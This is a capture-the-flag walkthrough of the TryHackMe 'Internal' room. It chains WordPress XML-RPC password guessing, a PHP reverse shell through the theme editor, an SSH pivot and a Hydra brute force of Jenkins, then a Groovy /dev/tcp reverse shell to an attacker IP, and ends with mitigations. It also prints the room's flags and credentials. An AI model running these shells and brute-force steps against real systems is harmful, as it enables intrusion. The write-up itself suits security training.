# Internal CTF Walkthrough

**Target:** Internal  
**Source:** [TryHackMe](https://tryhackme.com/room/internal)  
**Difficulty:** Hard  
**Target IP:** 10.114.180.67

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [WordPress Enumeration](#wordpress-enumeration)
- [WordPress Credential Brute Force](#wordpress-credential-brute-force)
- [Reverse Shell via Theme Editor](#reverse-shell-via-theme-editor)
- [Lateral Movement to aubreanna](#lateral-movement-to-aubreanna)
- [User Flag](#user-flag)
- [Pivoting to the Jenkins Container](#pivoting-to-the-jenkins-container)
- [Jenkins Brute Force & RCE](#jenkins-brute-force--rce)
- [Privilege Escalation](#privilege-escalation)
- [Root Flag](#root-flag)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Internal is a hard Linux box framed as a black-box penetration-testing engagement.
The objective is to gain a foothold on the system and escalate to root, capturing
both the user and root flags with no location provided. The attack chain covers
web and WordPress enumeration, an XML-RPC password attack to recover admin
credentials, RCE through the WordPress theme editor, lateral movement via a
plaintext credential note in `/opt`, a port-forward into an internal **Jenkins**
container, a Hydra brute force of the Jenkins login, RCE through the Jenkins
Script Console, and finally a `root` SSH password recovered from inside the
container.

**Key Skills Required:**
- Network scanning and service enumeration
- WordPress enumeration and XML-RPC password attacks (WPScan)
- RCE via WordPress theme editor
- Credential discovery and lateral movement (`su` / SSH)
- SSH local port forwarding to reach an internal service
- Jenkins login brute force (Hydra) and Script Console RCE
- Recovering a root credential from a Docker container

---

## Reconnaissance

> **Note:** Add `MACHINE_IP internal.thm` to `/etc/hosts` before starting.

```bash
nano /etc/hosts
10.114.180.67   internal.thm
```

### Network Scanning

```bash
nmap 10.114.180.67
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH |
| 80/tcp | http | Apache 2.4.29 (Ubuntu) |

Only two ports are exposed externally: SSH and a web server.

---

## Web Enumeration

### Directory Brute Force

Gobuster maps the web root and reveals a WordPress install plus phpMyAdmin:

```bash
gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt
```

```
blog          (Status: 301) [--> http://internal.thm/blog/]
index.html    (Status: 200)
javascript    (Status: 301)
phpmyadmin    (Status: 301)
wordpress     (Status: 301)
```

Browsing `http://internal.thm/blog/` shows a default WordPress "Hello world!"
post, confirming a WordPress blog.

---

## WordPress Enumeration

WPScan enumerates users and the WordPress version:

```bash
wpscan --url http://internal.thm/blog/ --enumerate u
```

Key findings:

- WordPress **5.4.2** (insecure, released 2020-06-10)
- XML-RPC enabled at `/blog/xmlrpc.php`
- Theme: `twentyseventeen`
- **User identified:** `admin`

> **Application:** WordPress 5.4.2 with XML-RPC enabled and user `admin`

---

## WordPress Credential Brute Force

With XML-RPC enabled, a password attack is launched against the `admin` user:

```bash
wpscan --url http://internal.thm/blog/ \
  --password-attack xmlrpc --max-threads 20 \
  -P /usr/share/wordlists/rockyou.txt
```

```
[SUCCESS] - admin / my2boys
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```

> **Recovered credentials:** `admin : my2boys`

Logging into `http://internal.thm/blog/wp-login.php` and revisiting the blog
reveals a hidden private post containing another set of credentials:

```
Private: To-Do
Don't forget to reset Will's credentials. william:arnold147
```

> **Recovered credentials:** `william : arnold147` (noted for later)

---

## Reverse Shell via Theme Editor

WordPress admin access allows editing theme PHP directly. Navigate to:

```
Appearance → Theme Editor → http://internal.thm/blog/wp-admin/theme-editor.php
```

Prepare a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
nano shell.php
```

```php
$ip   = '192.168.132.9';  // attacker IP
$port = 9090;
```

Paste the shell code into a writable theme file (e.g. `footer.php`) and start a
listener:

```bash
rlwrap nc -nvlp 9090
```

Triggering the modified theme file lands a shell as `www-data`:

```
connect to [192.168.132.9] from (UNKNOWN) [10.114.180.67]
$ whoami
www-data
```

Stabilize the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Lateral Movement to aubreanna

Enumerating `/opt` reveals a saved WordPress note with fresh credentials:

```bash
www-data@internal:/$ cat /opt/wp-save.txt
```

```
Bill,
Aubreanna needed these credentials for something later...
aubreanna:bubb13guM!@#123
```

> **Recovered credentials:** `aubreanna : bubb13guM!@#123`

Switch to the `aubreanna` user:

```bash
www-data@internal:/$ su aubreanna
Password: bubb13guM!@#123
aubreanna@internal:/$ whoami
aubreanna
```

> **Foothold:** `aubreanna`

---

## User Flag

The user flag is in `aubreanna`'s home directory:

```bash
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
```

> **User flag:** `THM{int3rna1_fl4g_1}`

A second file hints at an internal service:

```bash
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

`aubreanna` has no sudo rights, so the Jenkins service is the next target:

```bash
aubreanna@internal:~$ sudo -l
Sorry, user aubreanna may not run sudo on internal.
```

---

## Pivoting to the Jenkins Container

The Jenkins instance listens on `172.17.0.2:8080` — a Docker bridge address only
reachable from the host. An SSH local port forward exposes it on the attacker
machine:

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@10.114.180.67
```

Jenkins is now reachable locally at `http://localhost:8080/`.

---

## Jenkins Brute Force & RCE

The Jenkins login form is brute forced with Hydra. The form action and the
"Invalid username or password" failure string are taken from the request (Burp
helps capture them):

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 -f \
  http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password"
```

```
[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
```

> **Recovered credentials:** `admin : spongebob`

Log into Jenkins and open the **Script Console**:

```
http://127.0.0.1:8080/manage → http://127.0.0.1:8080/script
```

Run a Groovy reverse shell in the console:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.132.9/9091;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Start the listener:

```bash
rlwrap nc -nvlp 9091
```

A shell lands inside the Jenkins container as the `jenkins` user:

```
connect to [192.168.132.9] from (UNKNOWN) [10.114.180.67]
whoami
jenkins
```

---

## Privilege Escalation

Searching the container filesystem reveals a note left for `aubreanna`
containing the host **root** password:

```bash
find / -name *.txt
/opt/note.txt

cat /opt/note.txt
```

```
Aubreanna,
Will wanted these credentials secured behind the Jenkins container...
root:tr0ub13guM!@#123
```

> **Recovered credentials:** `root : tr0ub13guM!@#123`

The root password is reused for SSH on the host:

```bash
ssh root@10.114.180.67
root@internal:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Flag

```bash
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}
```

> **Root flag:** `THM{d0ck3r_d3str0y3r}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `THM{int3rna1_fl4g_1}` | `/home/aubreanna/user.txt` |
| Root flag | `THM{d0ck3r_d3str0y3r}` | `/root/root.txt` |

---

## Vulnerabilities

### 1. WordPress XML-RPC Password Attack (High)

**Description:** XML-RPC was enabled on WordPress 5.4.2, allowing high-throughput
password guessing against the `admin` account, which used a weak dictionary
password (`my2boys`).

**Impact:** Full WordPress admin access, the entry point for code execution.

**Mitigation:**
- Disable XML-RPC if unused, or restrict access to it.
- Enforce strong passwords and rate limiting / lockout on login.

### 2. RCE via WordPress Theme Editor (Critical)

**Description:** An authenticated admin could edit theme PHP files directly,
enabling a PHP reverse shell to be planted and executed.

**Impact:** Remote code execution as the `www-data` user.

**Mitigation:**
- Disable file editing in WordPress (`define('DISALLOW_FILE_EDIT', true);`).
- Apply least privilege to admin accounts and monitor theme changes.

### 3. Plaintext Credentials on Disk (High)

**Description:** Plaintext credentials were stored in world/locally readable files
— `/opt/wp-save.txt` (`aubreanna`) and `/opt/note.txt` (host `root`).

**Impact:** Lateral movement to `aubreanna` and full privilege escalation to
`root`.

**Mitigation:**
- Never store plaintext credentials in files on disk.
- Use a secrets manager and restrict file permissions.

### 4. Weak Jenkins Login (High)

**Description:** The internal Jenkins console used a weak password (`spongebob`)
guessable from `rockyou.txt`, despite being on a non-public Docker network.

**Impact:** Authenticated access to the Jenkins Script Console.

**Mitigation:**
- Enforce strong credentials and MFA on Jenkins.
- Restrict the Script Console to trusted administrators.

### 5. Jenkins Script Console RCE (Critical)

**Description:** The Jenkins Script Console allows arbitrary Groovy execution,
trivially yielding a reverse shell as the `jenkins` user.

**Impact:** Remote code execution inside the Jenkins container.

**Mitigation:**
- Limit Script Console access; treat it as a privileged capability.
- Segment and harden CI/CD containers; avoid storing host secrets within them.

### 6. Reused Root Password / Secret in Container (Critical)

**Description:** The host's `root` SSH password was stored inside the Jenkins
container and reused verbatim for SSH on the host.

**Impact:** Full host compromise as `root`.

**Mitigation:**
- Never store host credentials inside containers.
- Use unique, rotated credentials and key-based SSH for privileged accounts.

---

## Attack Chain Summary

```
Nmap scan → 2 open ports (SSH, HTTP)
    ↓
gobuster → /blog (WordPress), /phpmyadmin
    ↓
WPScan → WordPress 5.4.2, XML-RPC enabled, user: admin
    ↓
WPScan xmlrpc password attack → admin : my2boys
    ↓
WP login → private post → william : arnold147 (noted)
    ↓
Theme Editor (footer.php) → PHP reverse shell → www-data
    ↓
/opt/wp-save.txt → aubreanna : bubb13guM!@#123
    ↓
su aubreanna → User flag: THM{int3rna1_fl4g_1}
    ↓
jenkins.txt → Jenkins on 172.17.0.2:8080
    ↓
ssh -L 8080:172.17.0.2:8080 → reach Jenkins locally
    ↓
hydra → admin : spongebob
    ↓
Jenkins Script Console (Groovy) → reverse shell → jenkins
    ↓
/opt/note.txt → root : tr0ub13guM!@#123
    ↓
ssh root@host → Root flag: THM{d0ck3r_d3str0y3r}
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| Gobuster | Web directory enumeration |
| WPScan | WordPress enumeration and XML-RPC password attack |
| php-reverse-shell / netcat / rlwrap | Reverse shell and listener |
| ssh | Local port forwarding to reach the Jenkins container |
| Burp Suite | Capturing the Jenkins login form parameters |
| Hydra | Brute forcing the Jenkins login |
| Jenkins Script Console | Groovy reverse-shell RCE |

---

## References

- [TryHackMe — Internal](https://tryhackme.com/room/internal)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [WPScan](https://wpscan.com/)
- [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [WordPress — Disable File Editing](https://wordpress.org/documentation/article/hardening-wordpress/)
- [Jenkins Script Console](https://www.jenkins.io/doc/book/managing/script-console/)

---
